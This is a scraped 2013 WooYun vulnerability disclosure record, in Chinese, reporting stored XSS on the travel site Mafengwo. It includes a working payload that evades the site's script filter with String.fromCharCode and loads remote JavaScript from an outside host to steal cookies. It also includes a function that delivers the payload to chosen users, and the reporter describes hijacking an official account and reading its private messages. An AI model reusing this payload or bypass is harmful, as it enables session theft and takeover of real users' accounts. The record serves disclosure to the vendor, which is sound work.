{"id": 10449, "wybug_id": "wooyun-2013-028183", "wybug_title": "蚂蜂窝利用定向xss攻击拿官方账号（300万粉丝+任意文章管理）", "wybug_corp": "蚂蜂窝", "wybug_author": "小囧", "wybug_date": "2013-07-08 16:12", "wybug_open_date": "2013-08-22 16:13", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "利用技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-22：\t细节向公众公开  简要描述： 300万粉丝，任意文章编辑，置顶权限,妹纸一大把哈~~~~ 详细说明：  挑战粉丝的时候插入图片，onerror $.getScript 加载外部js。。发现对程序对script进行了过滤 然后用 String.fromCharCode 成功绕过。\n\n产生一条好友互动，应该看见了都会去点吧！~\n\n刚才xss进去的图片，偷cookie，然后修改src 变为一个表情演示下，让别人看不出来异常！\n\n抓包xss js代码， 然后往系统账号那里发送.....\nvar dd = function (uid) {  $.getJSON('http://www.mafengwo.cn/ajax/ajax_wagerother.php?touid='+uid+'&wagerid=5&challengeflg=challenge&cash=10000&msg=%3Cimg%2Fsrc%3D%221%22class%3D%22zj%22onerror%3D%22eval(String.fromCharCode(36%2C46%2C103%2C101%2C116%2C83%2C99%2C114%2C105%2C112%2C116%2C40%2C39%2C104%2C116%2C116%2C112%2C58%2C47%2C47%2C122%2C101%2C110%2C100%2C50%2C46%2C115%2C105%2C110%2C97%2C97%2C112%2C112%2C46%2C99%2C111%2C109%2C47%2C51%2C46%2C106%2C115%2C39%2C41%2C59))%22%3E',function(d){  console.log(d.msg);})}\n才发出去就收到cookie了！！！\n\n   漏洞证明：  \n\n任意文章编辑。。\n\n任意文章回复管理。。\n\n关注了下自己，随便看了看。私信里面很多和用户的互动信息。。其他有待发现了，   修复方案：     版权声明：转载请注明来源 小囧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-07-08 16:44 厂商回复： 处理中，非常感谢~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-08 16:36 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  关注    \n     2013-07-08 16:40 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  换qb的节奏？    \n     2013-07-08 16:42 |    \t\t小囧 \t\t\t( 普通白帽子  |\t\t\t        Rank:396 漏洞数:62        | 在通往牛B的路上一路狂奔)\t\t \n  @小胖胖要减肥 换了200qb了。。 想弄个平板，ipad mini 119估计也拍不上了~    \n     2013-07-08 16:47 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @小囧 MINI估计上300 我猜的    \n     2013-07-08 16:48 |    \t\t小囧 \t\t\t( 普通白帽子  |\t\t\t        Rank:396 漏洞数:62        | 在通往牛B的路上一路狂奔)\t\t \n  @小胖胖要减肥 我拍的时候 有个 上线 是130~  它不是有个上线么?怎么能出300    \n     2013-07-08 16:50 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @小囧 竞拍有个规则 你的wb减去起拍价再除2+原价  是你出的最高价  那就是说你有160左右？    \n     2013-07-08 16:51 |    \t\t小囧 \t\t\t( 普通白帽子  |\t\t\t        Rank:396 漏洞数:62        | 在通往牛B的路上一路狂奔)\t\t \n  擦~   怎么有这个 规则哟。。  嗯~ 160    \n     2013-07-08 16:52 |    \t\t小囧 \t\t\t( 普通白帽子  |\t\t\t        Rank:396 漏洞数:62        | 在通往牛B的路上一路狂奔)\t\t \n  @小胖胖要减肥 我还以为 出130 就可以直接把ipad mini 拿走勒~~~太2了~    \n     2013-07-08 16:54 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @小囧 囧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}